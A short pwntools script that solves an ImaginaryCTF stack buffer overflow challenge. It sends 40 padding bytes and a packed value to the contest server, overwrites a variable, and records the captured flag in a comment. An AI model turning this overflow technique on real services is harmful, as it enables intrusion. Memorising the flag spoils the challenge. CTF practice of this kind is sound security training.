from pwn import *

#target = process('./stackoverflow')

target = remote('chal.imaginaryctf.org', 42001)

print(target.recvuntil(b'color?'))

payload = b'a' * 40
payload += p64(0x69637466)
print(payload)

target.sendline(payload)

target.interactive()

#ictf{4nd_th4t_1s_why_y0u_ch3ck_1nput_l3ngth5_486b39aa}
